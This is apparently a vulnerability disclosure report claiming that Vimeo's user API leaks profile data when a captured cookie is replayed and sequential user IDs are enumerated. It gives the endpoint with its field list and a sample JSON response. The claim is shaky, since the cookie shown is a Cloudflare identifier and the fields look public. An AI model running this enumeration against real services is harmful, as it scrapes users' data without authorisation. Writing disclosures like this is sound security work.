# About Vimeo Website Information Disclosure Security Vulnerability Description

## 1 Security vulnerability implementation steps 
### 1.1 Get Header request data
Intercept browser Cookie information after logging in by a valid user.
```
Cookie:_cfuvid=hbeB.2xgQOS26X0B6BLFKGZPOAwQCxTNQNCay79EDvU-1712127143589-0.0.1.1-604800000; path=/; domain=.vimeo.com; HttpOnly; Secure; SameSite=None
```

### 1.2 Add cookie to the replay attack HTTP Request Header

## 2 Disclosure of user information by replay attack

> Leaked information includes: username,created_time,etc.

> Request method: GET, information can be obtained by traversing user id,such as "215028643","215028642"...

API URL\application unit and request parameters of verified project information leakage are shown in the following table:

| authenticated user | API URL | Request params |
|---------|---|-------------|
|Shixip Yahoo|https://api.vimeo.com/users/user215028643?fields=name%2Cgender%2Cbio%2Curi%2Clink%2Cbackground_video%2Clocation_details%2Cpictures%2Cverified%2Cmetadata.public_videos.total%2Cavailable_for_hire%2Ccan_work_remotely%2Cmetadata.connections.videos.total%2Cmetadata.connections.albums.total%2Cmetadata.connections.followers.total%2Cmetadata.connections.following.total%2Cmetadata.public_videos.total%2Cmetadata.connections.vimeo_experts.is_enrolled%2Ctotal_collection_count%2Ccreated_time%2Cprofile_preferences%2Cmembership%2Cclients%2Cskills%2Cproject_types%2Crates%2Ccategories%2Cis_expert%2Cwebsites%2Ccontact_emails&fetch_user_profile=1|user215028643|



### Leaked packet cases 
``` 
{
    "uri": "/users/215028643",
    "name": "shixip Yahoo",
    "link": "https://vimeo.com/user215028643",
    "gender": "m",
    "bio": "t678irf5iytdfoyigvuydretxzikhlo",
    ...
    "created_time": "2024-02-05T11:13:08+00:00",
    "pictures": {
        "uri": null,
        "active": false,
        "type": "default",
        "base_link": "https://i.vimeocdn.com/portrait/defaults-blue",
        
    "location_details": {
        "formatted_address": "",
        "latitude": null,
        "longitude": null,
        "city": null,
        "state": null,
        "neighborhood": null,
        "sub_locality": null,
        "state_iso_code": null,
        "country": null,
        "country_iso_code": null
    },
    ...
    "project_types": [],
    "categories": [],
    "background_video": [],
    "verified": true,
    "is_expert": false
}
```